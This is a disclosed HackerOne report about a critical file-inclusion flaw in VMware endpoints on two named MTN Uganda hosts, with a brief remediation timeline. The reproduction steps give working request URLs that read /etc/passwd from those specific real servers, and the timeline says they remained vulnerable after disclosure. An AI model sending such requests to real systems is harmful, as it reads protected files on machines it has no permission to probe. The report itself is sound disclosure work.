---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/remote-file-inclusion
  - env/web
substate: "resolved"
weakness: "Remote File Inclusion"
enriched: true
body: true
date: 2021-08-19
submitted: 2020-12-31T05:35:34.107Z
bounty_usd: null
votes: 16
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "0x0luke"
source: "https://hackerone.com/reports/1069105"
title: "2x Remote file inclusion within your VMware Instances"
---
# 2x Remote file inclusion within your VMware Instances

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 16 | **Program:** MTN Group | **Disclosed:** 2021-08-19

- Report: [https://hackerone.com/reports/1069105](https://hackerone.com/reports/1069105)
- CWE: Remote File Inclusion
- Submitted: 2020-12-31T05:35:34.107Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
2x Remote file inclusion within your VMware Instances

##Hosts: 

nmc.vc.mtn.co.ug
h28a.n1.ips.mtn.co.ug

## Steps To Reproduce:
Navigate to the URLs given below, /etc/passwd will be displayed.

https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
https://h28a.n1.ips.mtn.co.ug/eam/vib?id=/etc/passwd

## Impact

An attacker is able to view sensitive files on the server hosting this content and could potentially elevate this to a remote code execution.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-04-09** @0x0luke: Hi team, 

Just asking for an update on this issue, the sites are still vulnerable to this bug 2 months later, due to the nature I just wanted to check in and see if there's any updates.

Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
- **2021-08-20** @0x0luke: Team,

This vulnerability still exists in your infra and it’s disclosed…

Please apply patches ASAP
- **2021-08-27** @kdrmtn: This IP belongs to an external customer of MTN we have informed the customer of this vulnerability and they will take steps to remediate but this is not in MTN's control
